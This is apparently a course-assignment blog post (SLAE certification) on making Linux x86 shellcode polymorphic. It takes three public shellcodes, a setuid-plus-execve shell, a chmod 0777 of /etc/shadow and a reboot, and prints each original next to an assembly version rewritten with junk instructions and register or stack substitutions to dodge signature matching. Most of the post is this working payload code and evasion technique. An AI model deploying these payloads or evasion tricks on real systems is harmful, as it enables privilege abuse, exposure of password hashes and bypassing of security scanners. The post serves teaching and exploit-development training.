---
title:  "[SLAE 6] Polymorphic Shellcodes"
---

![Logo](/assets/images/tux-root.png)

For this assignment I've taken 3 shellcodes from  [Shell-Storm](http://shell-storm.org/) and modified them to avoid detection by pattern matching, thus achieving polymorphism (kind of, more on this later). Some techniques I've used to do this:

* Add garbage/nop-like instructions:

```c
nop

mov al,al  
mov bl,bl  
mov cl,cl  
...  
mov ax,ax  
mov bx,bx  
mov cx,cx  
...  
xchg ax,ax  
xchg bx,bx  
xchg cx,cx  
...  
lea eax, [eax + 0x00]  
lea eax, [eax + 0x00]  
lea eax, [eax + 0x00]  
```
* Add instructions without effect (e.g.: modify registers that don't affect the execution flow)
* Switch between _`mov`_, _`push`_ + _`pop`_, _`clear`_ + _`add`_:

| mov	| push + pop	| clear + add |
| :---:|:---:|:---: |
| mov al, 0xb	| push byte 0xb	| xor eax, eax|
| _ | pop eax	| add al, 0xb Z

* Switch between _`push`_ and _`mov`_ + _`add`_ + _`push`_:

| push	| mov + add + push |
| :---:|:---: |
| push 0x23456789	| mov esi, 0x12345678 |
| _ | add esi, 0x11111111 |
| _ | push esi |

* Change between _`push`_ and directly accessing the stack:

| push	| stack access |
| :---:|:---:|
| push 0x64777373	| mov dword [esp-4], 0x64777373 |
| _ | sub esp, 4 |

## 1. Execve()

First one is a polymorphic version of the _**`execve()`**_ of the following [shellcode](http://shell-storm.org/shellcode/files/shellcode-549.php): 
```c
    00000000  31C0              xor eax,eax
    00000002  31DB              xor ebx,ebx
    00000004  31C9              xor ecx,ecx
    00000006  B017              mov al,0x17
    00000008  CD80              int 0x80
    0000000A  31C0              xor eax,eax
    0000000C  50                push eax
    0000000D  686E2F7368        push dword 0x68732f6e
    00000012  682F2F6269        push dword 0x69622f2f
    00000017  89E3              mov ebx,esp
    00000019  8D542408          lea edx,[esp+0x8]
    0000001D  50                push eax
    0000001E  53                push ebx
    0000001F  8D0C24            lea ecx,[esp]
    00000022  B00B              mov al,0xb
    00000024  CD80              int 0x80
    00000026  31C0              xor eax,eax
    00000028  B001              mov al,0x1
    0000002A  CD80              int 0x80
```

And my changed version:
```c
    xor eax,eax
    mov ebx, eax            ; xor ebx,ebx
    mov ecx, ebx            ; xor ecx,ecx
    push 0x17               ; mov al,0x17
    pop ax
    xchg ecx, ecx           ; NOP added
    int 0x80                ; sys_setuid()

    xor eax,eax
    push eax
    mov dword [esp-4], 0x68732f6e ; push dword 0x68732f6e
    mov dword [esp-8], 0x69622f2f ; push dword 0x69622f2f
    sub esp, 8             ; increase the stack pointer
    mov ebx,esp
    lea edx,[esp+0x8]
    push eax
    push ebx
    lea ecx,[esp]
    mov al,0xb
    xor esi, esi            ; NOP added
    lea eax, [eax + esi]    ; NOP added
    int 0x80                ; execve()

    xor eax,eax
    mov al,0x1
    int 0x80                ; exit()
```

I've changed how registers are zeroed and how values were pushed on the stack and added some instructions with no effect.

## 2. Chmod /etc/shadow

The next [shellcode](http://shell-storm.org/shellcode/files/shellcode-828.php) changes the permissions of _`/etc/shadow`_ file: 
```c
    xor    %eax,%eax
    push   %eax
    pushl  $0x776f6461
    pushl  $0x68732f2f
    pushl  $0x6374652f
    movl   %esp,%esi
    push   %eax
    pushl  $0x37373730
    movl   %esp,%ebp
    push   %eax
    pushl  $0x646f6d68
    pushl  $0x632f6e69
    pushl  $0x622f2f2f
    mov    %esp,%ebx
    pushl  %eax
    pushl  %esi
    pushl  %ebp
    pushl  %ebx
    movl   %esp,%ecx
    mov    %eax,%edx
    mov    $0xb,%al
    int    $0x80
```

And my changed version: 
```c
    xor eax,eax
    push eax
    push dword 0x776f6461
    mov esi, 0x56611d1d         ; push dword 0x68732f2f
    lea edi, [esi]              ; junk
    add esi, 0x12121212
    push esi
    push dword 0x6374652f       ; '/etc/shadow'
    mov esi,esp
    push eax
    push dword 0x37373730       ; 0777
    mov ebp,esp
    push eax
    push dword 0x646f6d68
    mov edi, 0x030f0e09         ; push dword 0x632f6e69       
    add edi, 0x60206060
    push edi
    push word 0x622f            ; /bin/chmod
    mov ebx,esp
    push eax
    push esi
    push ebp
    push ebx
    mov ecx,esp
    mov edx,eax
    xor eax, eax                ; mov al,0xb
    add al, 0xa
    add al, 0x1
    xchg ecx, ecx               ; NOP added
    int 0x80
```

## 3. Reboot
Last one is a [reboot shellcode](http://shell-storm.org/shellcode/files/shellcode-69.php): 
```c
8048054:       31 c0                   xor    %eax,%eax
8048056:       50                      push   %eax
8048057:       68 62 6f 6f 74          push   $0x746f6f62
804805c:       68 6e 2f 72 65          push   $0x65722f6e
8048061:       68 2f 73 62 69          push   $0x6962732f
8048066:       89 e3                   mov    %esp,%ebx
8048068:       50                      push   %eax
8048069:       89 e2                   mov    %esp,%edx
804806b:       53                      push   %ebx
804806c:       89 e1                   mov    %esp,%ecx
804806e:       b0 0b                   mov    $0xb,%al
8048070:       cd 80                   int    $0x80
```

And my modified version: 
```c
    xor eax,eax
    push eax
    push dword 0x746f6f62
    mov edi, 0x05020f0e      ; push dword 0x65722f6e
    add edi,0x60702060
    push edi
    push dword 0x6962732f    ; /sbin/reboot
    mov ebx,esp
    push eax
    mov edx,esp
    push ebx
    mov ecx,esp
    push 0xa
    pop eax
    add al, 1                ; mov al,0xb
    int 0x80
```

##

The complete source files and scripts mentioned in this post can be found in my [SLAE Git repository](https://github.com/livz/slae).

**_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)_**
